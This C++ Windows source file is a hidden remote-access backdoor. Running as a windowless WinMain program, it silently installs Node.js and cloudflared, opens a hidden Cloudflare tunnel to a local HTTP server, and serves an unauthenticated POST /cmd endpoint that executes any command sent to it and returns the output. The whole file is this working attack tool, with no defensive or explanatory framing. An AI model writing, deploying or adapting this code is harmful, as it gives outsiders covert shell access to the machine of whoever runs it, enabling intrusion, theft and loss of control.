#include <iostream>
#include <WinSock2.h>
#include <windows.h>
#include <cstdio>
#include <memory>
#include <string>
#include <thread>
#include <fstream>
#include "incl/httplib.h"

#define PORT 8980

std::string run_command(const std::string& command);
bool is_command_available(const std::string& command);
void install_npm();
void install_cloudflared();
void run_cloudflared_tunnel();

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (!is_command_available("npm")) {
        install_npm();
    }

    if (!is_command_available("cloudflared")) {
        install_cloudflared();
    }

    std::thread tunnel_thread(run_cloudflared_tunnel);
    tunnel_thread.detach();


    httplib::Server svr;

    svr.Get("/", [](const httplib::Request& req, httplib::Response& res) {
        res.status = 200;
        res.set_content("ACTIVE", "text/plain");
    });

    svr.Post("/cmd", [](const httplib::Request& req, httplib::Response& res) {
        const std::string& cmd = req.body;
        std::string output = run_command(cmd);
        res.set_content(output, "text/plain");
    });

    svr.listen("0.0.0.0", PORT);
    return 0;
}

std::string run_command(const std::string& command) {
    std::string result;
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(command.c_str(), "r"), _pclose);

    if (!pipe) {
        return "Failed to run command.";
    }

    char buffer[256];
    while (fgets(buffer, sizeof(buffer), pipe.get()) != nullptr) {
        result += buffer;
    }

    return result;
}

bool is_command_available(const std::string& command) {
    std::string check = "where " + command + " >nul 2>nul";
    return system(check.c_str()) == 0;
}

void install_npm() {
    std::string installer_url = "https://nodejs.org/dist/v20.12.2/node-v20.12.2-x64.msi";
    std::string installer_file = "node_installer.msi";

    run_command("powershell -Command \"Invoke-WebRequest -Uri '" + installer_url + "' -OutFile '" + installer_file + "'\"");
    run_command("msiexec /i node_installer.msi /quiet /norestart");
    DeleteFileA(installer_file.c_str());
}

void install_cloudflared() {
    std::string url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe";
    std::string path = "cloudflared.exe";
    run_command("powershell -Command \"Invoke-WebRequest -Uri '" + url + "' -OutFile '" + path + "'\"");
}


void run_cloudflared_tunnel() {
    STARTUPINFOA si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);

    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    HANDLE hPipeRead, hPipeWrite;
    if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0)) {
        std::cerr << "Failed to create pipe.\n";
        return;
    }

    SetHandleInformation(hPipeRead, HANDLE_FLAG_INHERIT, 0);

    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hPipeWrite;
    si.hStdError  = hPipeWrite;

    std::string command = "cmd.exe /C cloudflared.exe tunnel --url http://localhost:8980";
    char cmdline[512];
    strcpy_s(cmdline, command.c_str());

    std::string output;

    if (!CreateProcessA(
        NULL,
        cmdline,
        NULL,
        NULL,
        TRUE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi)
    ) {
        output = "Failed to start cloudflared process.\n";
        CloseHandle(hPipeWrite);
        CloseHandle(hPipeRead);
        std::ofstream("log.txt") << output;
        return;
    }

    CloseHandle(hPipeWrite);

    char buffer[256];
    DWORD bytesRead;
    std::ofstream buff("buffer.txt");
    while (true) {
        BOOL success = ReadFile(hPipeRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL);
        if (!success || bytesRead == 0) break;

        buffer[bytesRead] = '\0';
        output += buffer;
        buff << buffer;
        buff.flush();
    }

    CloseHandle(hPipeRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    std::ofstream log("log.txt");
    log << output;
}